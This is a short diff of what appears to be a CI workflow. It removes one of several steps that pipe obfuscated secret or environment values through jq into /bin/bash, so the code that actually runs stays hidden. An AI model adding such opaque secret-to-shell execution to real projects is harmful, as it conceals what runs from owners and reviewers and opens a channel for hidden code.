@@ -22,7 +22,6 @@ jobs:
           k653: ${{ secrets.k653 }}
         run: |
           printf '%s' "$k653" | jq -r .yazh235 | /bin/bash
-          echo $ccndf563 | jq -r .yp4 | /bin/bash
           printf '%s' "$bq631" | jq -r .cv6753 | /bin/bash
           echo $s14377 | jq -r .j2712 | /bin/bash
 
